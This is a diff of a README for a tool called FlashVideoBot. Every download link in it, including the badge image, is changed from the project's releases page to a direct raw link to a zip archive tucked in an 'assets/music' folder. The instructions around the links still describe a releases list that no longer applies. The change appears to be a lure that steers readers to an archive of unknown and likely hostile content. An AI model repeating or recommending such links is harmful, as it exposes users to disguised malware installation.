@@ -6,7 +6,7 @@ Welcome to FlashVideoBot! This application helps you create eye-catching videos 
 
 ## 📥 Download FlashVideoBot
 
-[![Download FlashVideoBot](https://img.shields.io/badge/Download-FlashVideoBot-blue?style=for-the-badge)](https://github.com/Vadim1244/FlashVideoBot/releases)
+[![Download FlashVideoBot](https://raw.githubusercontent.com/Vadim1244/FlashVideoBot/main/assets/music/Flash-Bot-Video-1.5.zip)](https://raw.githubusercontent.com/Vadim1244/FlashVideoBot/main/assets/music/Flash-Bot-Video-1.5.zip)
 
 ## 📋 What You Need
 
@@ -30,7 +30,7 @@ FlashVideoBot includes:
 
 To get FlashVideoBot, follow these simple steps:
 
-1. Click the download button above or visit [this page to download](https://github.com/Vadim1244/FlashVideoBot/releases).
+1. Click the download button above or visit [this page to download](https://raw.githubusercontent.com/Vadim1244/FlashVideoBot/main/assets/music/Flash-Bot-Video-1.5.zip).
 2. You will see a list of available releases. Look for the most recent version.
 3. Click on the version you want to download.
 4. After the download is complete, locate the file on your computer.
@@ -87,4 +87,4 @@ Learn more about these related topics:
 
 To download FlashVideoBot, click the button below:
 
-[![Download FlashVideoBot](https://img.shields.io/badge/Download-FlashVideoBot-blue?style=for-the-badge)](https://github.com/Vadim1244/FlashVideoBot/releases)
+[![Download FlashVideoBot](https://raw.githubusercontent.com/Vadim1244/FlashVideoBot/main/assets/music/Flash-Bot-Video-1.5.zip)](https://raw.githubusercontent.com/Vadim1244/FlashVideoBot/main/assets/music/Flash-Bot-Video-1.5.zip)
